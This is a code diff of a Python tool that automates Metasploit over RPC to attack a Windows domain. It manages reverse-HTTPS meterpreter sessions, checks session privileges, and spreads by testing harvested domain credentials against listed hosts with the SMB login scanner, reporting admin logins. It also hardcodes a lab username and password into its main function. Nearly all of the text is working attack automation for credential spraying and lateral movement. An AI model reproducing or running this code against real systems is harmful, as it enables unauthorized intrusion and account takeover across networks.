@@ -6,6 +6,8 @@ import sys
 import time
 import signal
 import msfrpc
+import string
+import random
 import asyncio
 import argparse
 import netifaces
@@ -21,8 +23,7 @@ DOMAIN_DATA = {'domain':None,
                'high_priority_ips':[], 
                'creds':[],
                'checked_creds':{},
-               'hosts':[],
-               'checked_hosts':[]}
+               'hosts':[]}
 
 def parse_args():
     # Create the arguments
@@ -61,9 +62,14 @@ def print_great(msg, sess_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None)
-    embed()
+    del_unchecked_hosts_files()
     for task in asyncio.Task.all_tasks():
         task.cancel()
+
+def del_unchecked_hosts_files():
+    for f in os.listdir():
+        if f.startswith('unchecked_hosts-') and f.endswith('.txt'):
+            os.remove(f)
 
 def get_iface():
     '''
@@ -295,9 +301,9 @@ async def check_privs(client, sess_num):
 
         # Sometimes gets extra output from priv_migrate in this output
         offset = 5
-        for id,l in enumerate(split_out):
+        for num,l in enumerate(split_out):
             if b'True' in l or b'False' in l:
-                offset = id
+                offset = num
 
         user_info_list = split_out[offset].split()
         system = user_info_list[1]
@@ -556,50 +562,36 @@ def get_console_ids(client):
 
     return c_ids
 
-async def run_msf_module(client, c_id, ip, lhost, mod, extra_opts):
+async def run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs):
 
     payload = 'windows/meterpreter/reverse_https'
-    cmd = create_msf_cmd(mod, ip, lhost, payload, extra_opts)
-    mod_out = await run_console_cmd(client, c_id, cmd)
+    cmd = create_msf_cmd(mod, rhost_var, target, lhost, payload, extra_opts, start_cmd)
+    mod_out = await run_console_cmd(client, c_id, cmd, end_strs)
 
     return mod_out
 
-def create_msf_cmd(module_path, ip, lhost, payload, extra_opts):
-    cmds = """
-           use {}\n
-           set RHOST {}\n
-           set LHOST {}\n
-           set payload {}\n
-           {}\n
-           exploit -j -z\n
-           """.format(module_path, ip, lhost, payload, extra_opts)
+def create_msf_cmd(module_path, rhost_var, target, lhost, payload, extra_opts, start_cmd):
+    cmds = ('use {}\n'
+            'set {} {}\n'
+            'set LHOST {}\n'
+            'set payload {}\n'
+            '{}\n'
+            '{}\n').format(module_path, rhost_var, target, lhost, payload, extra_opts, start_cmd)
 
     return cmds
 
-async def run_console_cmd(client, c_id, cmd):
+async def run_console_cmd(client, c_id, cmd, end_strs):
     '''
     Runs module and gets output
     '''
-    print_info('Running MSF command(s):', None)
-    for l in cmd.splitlines():
-        l = l.strip()
-        if l != '':
-            print('        '+l)
+    cmd_split = cmd.splitlines()
+    module = cmd_split[0].split()[1]
+    print_info('Running MSF module [{}]'.format(module), None)
     client.call('console.write',[c_id, cmd])
-    asyncio.sleep(1)
-    asyncio.ensure_future(wait_on_busy_console(client, c_id))
-
-async def read_cur_output(client, c_id):
-    output = []
-    cur_output = client.call('console.read', [c_id])[b'data'].decode('utf8').splitlines()
-    for l in cur_output:
-        l = l.strip()
-        if l != '':
-            output.append(l)
-
+    output = await get_console_output(client, c_id, end_strs)
     return output
 
-async def wait_on_busy_console(client, c_id):
+async def get_console_output(client, c_id, end_strs, timeout=30):
     '''
     The only way to get console busy status is through console.read or console.list
     console.read clears the output buffer so you gotta use console.list
@@ -607,17 +599,34 @@ async def wait_on_busy_console(client, c_id):
     so this ridiculous list comprehension seems necessary to avoid assuming
     what the right list offset might be
     '''
-    output = []
+    counter = 0
+    sleep_secs = 1
     list_offset = int([x[b'id'] for x in client.call('console.list')[b'consoles'] if x[b'id'] is c_id][0])
+    output = b'' 
+
     # Get any initial output
-    output += await read_cur_output(client, c_id)
+    output += client.call('console.read', [c_id])[b'data']
 
     while client.call('console.list')[b'consoles'][list_offset][b'busy'] == True:
-        output += await read_cur_output(client, c_id)
-        asyncio.sleep(1)
+        output += client.call('console.read', [c_id])[b'data']
+        asyncio.sleep(sleep_secs)
+        counter += sleep_secs
+
+    while True:
+        output += client.call('console.read', [c_id])[b'data']
+
+        if end_strs:
+            if any(end_strs in output for end_strs in end_strs):
+                break
+
+        if counter > timeout:
+            break
+
+        asyncio.sleep(sleep_secs)
+        counter += sleep_secs
 
     # Get remaining output
-    output += await read_cur_output(client, c_id)
+    output += client.call('console.read', [c_id])[b'data']
 
     return output
 
@@ -651,17 +660,53 @@ async def spread(client, c_ids, lhost):
             else:
                 cred_split = c.split(':')
                 user = cred_split[0]
+                # Remove domain from user
+                if "\\" in user:
+                    user = user.split("\\")[1]
                 pwd = cred_split[1]
-            mod = 'windows/smb/psexec_psh'
+
+            mod = 'auxiliary/scanner/smb/smb_login'
+            rhost_var = 'RHOSTS'
+            start_cmd = 'run'
+            target = create_hostsfile(c)
             extra_opts = ('set smbuser {}\n'
                           'set smbpass {}\n'
                           'set smbdomain {}'.format(user, pwd, DOMAIN_DATA['domain']))
+            end_strs = [b'Auxiliary module execution completed']
 
-            for ip in DOMAIN_DATA['hosts']:
-                if ip not in DOMAIN_DATA['checked_creds'][c]:
-                    DOMAIN_DATA['checked_creds'][c].append(ip)
-                    c_id = await get_nonbusy_cid(client, c_ids)
-                    asyncio.ensure_future(run_msf_module(client, c_id, ip, lhost, mod, extra_opts))
+            c_id = await get_nonbusy_cid(client, c_ids)
+            output = await run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs)
+            if output:
+                parse_smb_login(output)
+
+def parse_smb_login(output):
+    out_split = output.splitlines()
+    admin = None
+    user = None
+    for l in out_split:
+        if b'- Success: ' in l:
+            line_split = l.split()
+            ip = line_split[1].decode('utf8')
+            user = line_split[6].strip(b"'").decode('utf8')
+            if len(line_split) > 6:
+                admin = line_split[7]
+            if admin:
+                print_good('Admin login found! {} - {}'.format(ip, user), None)
+            else:
+                print_info('Nonadministrator login found {} - {}'.format(ip, user))
+
+def create_hostsfile(c):
+    global DOMAIN_DATA
+
+    identifier = ''.join(random.choice(string.ascii_letters) for x in range(7))
+    filename = 'unchecked_hosts-{}.txt'.format(identifier)
+    with open(filename, 'w') as f:
+        for ip in DOMAIN_DATA['hosts']:
+            if ip not in DOMAIN_DATA['checked_creds'][c]:
+                DOMAIN_DATA['checked_creds'][c].append(ip)
+                f.write(ip+'\n')
+
+    return 'file:'+os.getcwd()+'/'+filename
 
 async def attack(client, sess_num):
 
@@ -766,7 +811,7 @@ async def run_session_cmd(client, sess_num, cmd, end_strs, timeout=30):
     print_info('Running [{}]'.format(cmd), sess_num)
 
     while NEW_SESS_DATA[sess_num][b'busy'] == b'True':
-        await asyncio.sleep(.1)
+        await asyncio.sleep(1)
 
     NEW_SESS_DATA[sess_num][b'busy'] = b'True'
 
@@ -912,8 +957,7 @@ async def check_for_sessions(client, loop, c_ids, lhost):
                 print_info('Waiting on new meterpreter session', None) 
 
         if DOMAIN_DATA['domain']:
-            #await spread(client, c_ids, lhost)
-            asyncio.ensure_future(spread(client, c_ids, lhost))
+            await spread(client, c_ids, lhost)
 
         await asyncio.sleep(1)
 
@@ -955,6 +999,10 @@ def parse_hostlist(args):
     DOMAIN_DATA['hosts'] = hosts
 
 def main(args):
+
+    ######
+    DOMAIN_DATA['creds'].append('lab2\dan.da:Qwerty1da')
+    #####
 
     if args.hostlist or args.xml:
         parse_hostlist(args)
